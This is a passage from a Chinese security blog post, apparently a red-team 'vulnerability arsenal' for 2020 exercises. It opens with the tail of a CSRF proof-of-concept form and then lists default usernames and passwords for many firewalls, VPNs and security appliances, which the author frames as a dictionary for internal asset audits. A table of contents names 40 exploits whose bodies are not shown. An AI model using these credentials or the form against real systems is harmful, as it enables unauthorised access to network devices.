value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;description&amp;#93;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;weigh&amp;#93;&quot; value&#x3D;&quot;0&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;status&amp;#93;&quot; value&#x3D;&quot;normal&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;row&amp;#91;flag&amp;#93;&amp;#91;&amp;#93;&quot; value&#x3D;&quot;&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit request&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="一些弱口令字典"><a href="#一些弱口令字典" class="headerlink" title="一些弱口令字典:"></a>一些弱口令字典:</h2><p>使用范围不限于系统服务、应用服务、应用程序,可以用这些生成字典对内网资产巡检。</p>
<p>泛微OA默认system账号: system/system<br>Apache DolphinScheduler: admin/dolphinscheduler<br>1、账号<a href="mailto:&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#99;&#111;&#x6d;">&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#97;&#100;&#x6d;&#x69;&#110;&#x2e;&#99;&#111;&#x6d;</a> superadmin admin123<br>xadmin system admin root<br>2、密码<br>$companyName$@2020</p>
<p>$companyName$2020</p>
<p>$companyName$123 admin123<br>12345678</p>
<p>123456</p>
<p>admin root<br>为啥没写administrators, 因为上面都是我随便想出来的,这个我记不住。<br>安全设备弱密码排查列表:<br>天融信防火墙 用户名:superman 密码:talent<br>天融信防火墙 用户名:superman 密码:talent!23<br>联想网御防火墙 用户名:admin 密码:leadsec@7766、administrator、bane@7766 深信服防火墙 用户名：admin 密码：admin<br>启明星辰 用户名：admin 密码：bane@7766 用户名：admin 密码：admin@123 juniper 用户名:netscreen 密码:netscreen<br>Cisco 用 户 名 :admin 密 码 :cisco Huawei 用户名:admin 密码:Admin@123 H3C 用户名:admin 密码:admin<br>绿盟IPS 用户名: weboper 密码: weboper<br>网神防火墙GE1 用户名：admin 密码：firewall 深信服VPN：51111端口 密码:delanrecover 华为VPN：账号：root 密码：mduadmin<br>华为防火墙：admin 密码:Admin@123<br>EudemonJuniper防火墙：netscreen netscreen<br>迪普 192.168.0.1 默认的用户名和密码（admin/admin_default)<br>山石 192.168.1.1 默认的管理账号为hillstone，密码为hillstone 安恒的明御防火墙 admin/adminadmin<br>某堡垒机 shterm/shterm</p>
<p>天融信的vpn test/123456<br>绿盟安全产品默认密码排查列表:<br>IPS入侵防御系统、SASH运维安全管理系统、SAS安全审计系统、DAS数据库审计系统、RSAS远程安全评估系统、WAF WEB应用防护系统<br>sysauditor/sysauditor<br>sysmanager/sysmanager<br>supervisor/supervisor<br>maintainer/maintainer<br>webpolicy/webpolicy<br>sysadmin/sysadmin<br>conadmin/conadmin<br>supervis/supervis<br>webaudit/webaudit<br>sysadmin/sysadmin<br>conadmin/nsfocus<br>weboper/weboper<br>auditor/auditor<br>weboper/weboper<br>nsadmin/nsadmin<br>admin/nsfocus<br>admin/admin<br>shell/shell</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Harbor</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://harbors.vip/post/hw.html">http://harbors.vip/post/hw.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://harbors.vip" target="_blank">Harbor</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/HW/">HW</a><a class="post-meta__tags" href="/tags/2020/">2020</a></div><div class="post_share"><div class="social-share" data-image="/image/3.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/post/webldxf.html"><img class="next-cover" src="/image/1.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Web常见漏洞描述及修复建议</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/TX.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="avatar"/><div class="author-info__name">Harbor</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div><a class="button--animated" id="card-info-btn" href="JavaScript:AddFavorite('https://harbors.vip','harbor')"><i class="fa fa-bookmark"></i><span>加入书签</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:harbor104909@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/sitemap.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">随风前行！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BD%90%E6%B2%BB%E5%A0%A1%E5%9E%92%E6%9C%BA%E5%89%8D%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CNVD-2019-20835%EF%BC%89"><span class="toc-number">1.</span> <span class="toc-text">齐治堡垒机前远程命令执行漏洞（CNVD-2019-20835）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A9%E8%9E%8D%E4%BF%A1TopApp-LB-%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%B3%BB%E7%BB%9FSql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">天融信TopApp-LB 负载均衡系统Sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E5%8F%8BGRP-u8-%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">用友GRP-u8 注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%BF%E7%9B%9FUTS%E7%BB%BC%E5%90%88%E5%A8%81%E8%83%81%E6%8E%A2%E9%92%88%E7%AE%A1%E7%90%86%E5%91%98%E4%BB%BB%E6%84%8F%E7%99%BB%E5%BD%95"><span class="toc-number">4.</span> <span class="toc-text">绿盟UTS综合威胁探针管理员任意登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%95%B0%E6%8D%AE%E9%98%B2%E6%B3%84%E6%BC%8F%E7%B3%BB%E7%BB%9F%E8%B6%8A%E6%9D%83%E4%BF%AE%E6%94%B9%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81"><span class="toc-number">5.</span> <span class="toc-text">天融信数据防泄漏系统越权修改管理员密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WPS-Office-%E5%9B%BE%E7%89%87%E8%A7%A3%E6%9E%90%E9%94%99%E8%AF%AF%E5%AF%BC%E8%87%B4%E5%A0%86%E6%8D%9F%E5%9D%8F%EF%BC%8C%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">6.</span> <span class="toc-text">WPS Office 图片解析错误导致堆损坏，任意代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">7.</span> <span class="toc-text">SANGFOR终端检测响应平台-任意用户登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%90%E4%BF%A1%E6%9C%8DEDR%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%ABpayload"><span class="toc-number">8.</span> <span class="toc-text">某信服EDR漏洞-包含payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sangfor-EDR-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.</span> <span class="toc-text">sangfor EDR RCE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E8%BD%AF%E7%A7%91%E6%8A%80%E4%BA%A7%E5%93%81%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">10.</span> <span class="toc-text">联软科技产品存在任意文件上传和命令执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-Bsh-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">11.</span> <span class="toc-text">泛微OA Bsh 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AEOA-e-cology-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">12.</span> <span class="toc-text">泛微OA e-cology SQL注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8DVPN%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">13.</span> <span class="toc-text">深信服VPN远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8D-VPN-%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4"><span class="toc-number">14.</span> <span class="toc-text">深信服 VPN 口令爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E8%BE%B9%E7%95%8C%E4%BA%A7%E5%93%81-%E9%98%B2%E7%81%AB%E5%A2%99-%E7%BD%91%E5%85%B3-%E8%B7%AF%E7%94%B1%E5%99%A8-VPN-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">15.</span> <span class="toc-text">常见边界产品(防火墙, 网关, 路由器, VPN) 弱口令漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Thinkphp-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">16.</span> <span class="toc-text">Thinkphp 相关漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">17.</span> <span class="toc-text">Spring 系列漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solr-%E7%B3%BB%E5%88%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">18.</span> <span class="toc-text">Solr 系列漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ghostscript-%E4%B8%8A%E4%BC%A0%E5%9B%BE%E7%89%87%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">19.</span> <span class="toc-text">Ghostscript 上传图片代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%9B%E5%BE%AE%E4%BA%91%E6%A1%A5%E5%A4%8D%E7%8E%B0"><span class="toc-number">20.</span> <span class="toc-text">泛微云桥复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%91%9E%E8%BE%BEwebVPN-RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">21.</span> <span class="toc-text">网瑞达webVPN RCE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-DolphinScheduler%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2020-11974%E3%80%81CVE-2020-13922%EF%BC%89"><span class="toc-number">22.</span> <span class="toc-text">Apache DolphinScheduler高危漏洞（CVE-2020-11974、CVE-2020-13922）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BFphpMyadmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">23.</span> <span class="toc-text">宝塔面板phpMyadmin未授权访问</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-16875-Exchange-Server-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">24.</span> <span class="toc-text">CVE-2020-16875: Exchange Server 远程代码执行漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PhpStudy-nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">25.</span> <span class="toc-text">PhpStudy nginx解析漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Cocoon-XML%E6%B3%A8%E5%85%A5-CVE-2020-11991"><span class="toc-number">26.</span> <span class="toc-text">Apache Cocoon XML注入 [CVE-2020-11991]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Horde-Groupware-Webmail-Edition-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">27.</span> <span class="toc-text">Horde Groupware Webmail Edition 远程命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95"><span class="toc-number">28.</span> <span class="toc-text">通达OA任意用户登录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA-v11-7-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">29.</span> <span class="toc-text">通达OA v11.7 后台SQL注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wordpress-File-manager%E6%8F%92%E4%BB%B6%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">30.</span> <span class="toc-text">Wordpress File-manager插件任意文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pligg-CMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-CVE-2020-25287"><span class="toc-number">31.</span> <span class="toc-text">Pligg CMS远程代码执行[CVE-2020-25287]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZeroLogon%E6%8E%A5%E7%AE%A1%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%BC%8F%E6%B4%9E-CVE-2020-1472"><span class="toc-number">32.</span> <span class="toc-text">ZeroLogon接管域控权限漏洞[CVE-2020-1472]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkAdminV6-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C"><span class="toc-number">33.</span> <span class="toc-text">ThinkAdminV6 任意文件操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-1181%EF%BC%9ASharePoint%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">34.</span> <span class="toc-text">CVE-2020-1181：SharePoint远程代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8DSSL-VPN%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">35.</span> <span class="toc-text">深信服SSL VPN任意密码重置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B7%B1%E4%BF%A1%E6%9C%8DSSL-VPN%E4%BF%AE%E6%94%B9%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E6%89%8B%E6%9C%BA%E5%8F%B7"><span class="toc-number">36.</span> <span class="toc-text">深信服SSL VPN修改任意账户手机号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BE%BEOA-v11-6%E7%89%88%E6%9C%ACRCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">37.</span> <span class="toc-text">通达OA v11.6版本RCE漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#F5%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%EF%BC%9Acve-2020-5902"><span class="toc-number">38.</span> <span class="toc-text">F5负载均衡：cve-2020-5902</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastadmin%E5%89%8D%E5%8F%B0getshell-csrf-xss"><span class="toc-number">39.</span> <span class="toc-text">fastadmin前台getshell+csrf+xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AD%97%E5%85%B8"><span class="toc-number">40.</span> <span class="toc-text">一些弱口令字典:</span></a></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/hw.html" title="2020HW漏洞武器库"><img src="/image/3.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="2020HW漏洞武器库"/></a><div class="content"><a class="title" href="/post/hw.html" title="2020HW漏洞武器库">2020HW漏洞武器库</a><time datetime="2020-11-16T01:19:00.000Z" title="发表于 2020-11-16 09:19:00">2020-11-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/webldxf.html" title="Web常见漏洞描述及修复建议"><img src="/image/1.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="Web常见漏洞描述及修复建议"/></a><div class="content"><a class="title" href="/post/webldxf.html" title="Web常见漏洞描述及修复建议">Web常见漏洞描述及修复建议</a><time datetime="2020-10-31T09:22:00.000Z" title="发表于 2020-10-31 17:22:00">2020-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/cve-2020-0796.html" title="CVE-2020-0796“永恒之黑”漏洞复现"><img src="/image/2.jpg" onerror="this.onerror=null;this.src='/img/404.png'" alt="CVE-2020-0796“永恒之黑”漏洞复现"/></a><div class="content"><a class="title" href="/post/cve-2020-0796.html" title="CVE-2020-0796“永恒之黑”漏洞复现">CVE-2020-0796“永恒之黑”漏洞复现</a><time datetime="2020-10-31T07:54:00.000Z" title="发表于 2020-10-31 15:54:00">2020-10-31</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By Harbor</div><div class="footer_custom_text"><p> <a target="_blank" href="https://hexo.io/"><img src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp; <a target="_blank" href="https://demo.jerryc.me/"><img src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp; <a target="_blank" href="https://GitHub.com/ "><img src="https://img.shields.io/badge/Hosted-Github-brightgreen?style=flat&logo=GitHub" title="本站线路托管于Github"></a>&nbsp; <a target="_blank" href="https://github.com/features/actions"><img src="https://img.shields.io/badge/Deploy-Github%20Actoion-d021d6?style=flat&logo=data:image/svg+xml;base64,PHN2ZyByb2xlPSJpbWciIHZpZXdCb3g9IjAgMCAyNCAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48dGl0bGU+R2l0SHViIEFjdGlvbnMgaWNvbjwvdGl0bGU+PHBhdGggZD0iTTEwLjk4NCAxMy44MzZhLjUuNSAwIDAgMS0uMzUzLS4xNDZsLS43NDUtLjc0M2EuNS41IDAgMSAxIC43MDYtLjcwOGwuMzkyLjM5MSAxLjE4MS0xLjE4YS41LjUgMCAwIDEgLjcwOC43MDdsLTEuNTM1IDEuNTMzYS41MDQuNTA0IDAgMCAxLS4zNTQuMTQ2em05LjM1My0uMTQ3bDEuNTM0LTEuNTMyYS41LjUgMCAwIDAtLjcwNy0uNzA3bC0xLjE4MSAxLjE4LS4zOTItLjM5MWEuNS41IDAgMSAwLS43MDYuNzA4bC43NDYuNzQzYS40OTcuNDk3IDAgMCAwIC43MDYtLjAwMXpNNC41MjcgNy40NTJsMi41NTctMS41ODVBMSAxIDAgMCAwIDcuMDkgNC4xN0w0LjUzMyAyLjU2QTEgMSAwIDAgMCAzIDMuNDA2djMuMTk2YTEuMDAxIDEuMDAxIDAgMCAwIDEuNTI3Ljg1em0yLjAzLTIuNDM2TDQgNi42MDJWMy40MDZsMi41NTcgMS42MXpNMjQgMTIuNWMwIDEuOTMtMS41NyAzLjUtMy41IDMuNWEzLjUwMyAzLjUwMyAwIDAgMS0zLjQ2LTNoLTIuMDhhMy41MDMgMy41MDMgMCAwIDEtMy40NiAzIDMuNTAyIDMuNTAyIDAgMCAxLTMuNDYtM2gtLjU1OGMtLjk3MiAwLTEuODUtLjM5OS0yLjQ4Mi0xLjA0MlYxN2MwIDEuNjU0IDEuMzQ2IDMgMyAzaC4wNGMuMjQ0LTEuNjkzIDEuNy0zIDMuNDYtMyAxLjkzIDAgMy41IDEuNTcgMy41IDMuNVMxMy40MyAyNCAxMS41IDI0YTMuNTAyIDMuNTAyIDAgMCAxLTMuNDYtM0g4Yy0yLjIwNiAwLTQtMS43OTQtNC00VjkuODk5QTUuMDA4IDUuMDA4IDAgMCAxIDAgNWMwLTIuNzU3IDIuMjQzLTUgNS01czUgMi4yNDMgNSA1YTUuMDA1IDUuMDA1IDAgMCAxLTQuOTUyIDQuOTk4QTIuNDgyIDIuNDgyIDAgMCAwIDcuNDgyIDEyaC41NThjLjI0NC0xLjY5MyAxLjctMyAzLjQ2LTNhMy41MDIgMy41MDIgMCAwIDEgMy40NiAzaDIuMDhhMy41MDMgMy41MDMgMCAwIDEgMy40Ni0zYzEuOTMgMCAzLjUgMS41NyAzLjUgMy41em0tMTUgOGMwIDEuMzc4IDEuMTIyIDIuNSAyLjUgMi41czIuNS0xLjEyMiAyLjUtMi41LTEuMTIyLTIuNS0yLjUtMi41UzkgMTkuMTIyIDkgMjAuNXpNNSA5YzIuMjA2IDAgNC0xLjc5NCA0LTRTNy4yMDYgMSA1IDEgMSAyLjc5NCAxIDVzMS43OTQgNCA0IDR6bTkgMy41YzAtMS4zNzgtMS4xMjItMi41LTIuNS0yLjVTOSAxMS4xMjIgOSAxMi41czEuMTIyIDIuNSAyLjUgMi41IDIuNS0xLjEyMiAyLjUtMi41em05IDBjMC0xLjM3OC0xLjEyMi0yLjUtMi41LTIuNVMxOCAxMS4xMjIgMTggMTIuNXMxLjEyMiAyLjUgMi41IDIuNSAyLjUtMS4xMjIgMi41LTIuNXptLTEzIDhhLjUuNSAwIDEgMCAxIDAgLjUuNSAwIDAgMC0xIDB6bTIgMGEuNS41IDAgMSAwIDEgMCAuNS41IDAgMCAwLTEgMHptMTIgMGMwIDEuOTMtMS41NyAzLjUtMy41IDMuNWEzLjUwMyAzLjUwMyAwIDAgMS0zLjQ2LTMuMDAyYy0uMDA3LjAwMS0uMDEzLjAwNS0uMDIxLjAwNWwtLjUwNi4wMTdoLS4wMTdhLjUuNSAwIDAgMS0uMDE2LS45OTlsLjUwNi0uMDE3Yy4wMTgtLjAwMi4wMzUuMDA2LjA1Mi4wMDdBMy41MDMgMy41MDMgMCAwIDEgMjAuNSAxN2MxLjkzIDAgMy41IDEuNTcgMy41IDMuNXptLTEgMGMwLTEuMzc4LTEuMTIyLTIuNS0yLjUtMi41UzE4IDE5LjEyMiAxOCAyMC41czEuMTIyIDIuNSAyLjUgMi41IDIuNS0xLjEyMiAyLjUtMi41eiIvPjwvc3ZnPg==" title="本站项目由Gtihub Action持续部署"></a>&nbsp; <a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a> </p></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
 <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script>function AddFavorite(sURL, sTitle){try{window.external.addFavorite(sURL, sTitle);}catch (e){try{window.sidebar.addPanel(sTitle, sURL, "");}catch (e){alert("请按住ctrl+D，将本博客加入收藏夹");}}}</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script><script>(function(){
  const bp = document.createElement('script');
  const curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https'){
  bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else{
  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  bp.dataset.pjax = ''
  const s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})()</script></div></body></html>